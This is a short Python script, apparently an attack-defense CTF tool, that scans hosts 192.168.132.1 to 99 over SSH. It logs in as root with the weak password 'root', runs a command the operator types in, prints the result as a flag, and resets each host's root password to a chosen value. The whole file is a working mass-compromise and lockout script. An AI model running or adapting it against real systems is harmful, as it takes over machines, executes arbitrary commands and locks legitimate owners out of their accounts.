import paramiko
username = 'root'
passwd = 'root'    #弱口令
host = "192.168.132."

def C(cmd,newpw):
    for num in range(1,100):
        ip = host+str(num)
        print("正在连接",ip)
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(hostname=ip,port = 22,username=username,password=passwd,timeout=1) 
            stdin,stdout,stderr = ssh.exec_command(cmd)
            flag = stdout.read().decode('utf-8')
            print("目标:"+ip+"存在漏洞，内容为:"+flag,end='')
            print("IP:"+ip+"密码已修改成:"+newpw)
            check="echo"+" root:"+ newpw + " | chpasswd"
            stdin1,stdout1,stderr1 = ssh.exec_command(check)
            ssh.close()
        except:
            pass

if __name__=='__main__':
    cmd=input("请输入值你需要执行的命令:")
    newpw=input("需要修改的密码:")
    C(cmd,newpw)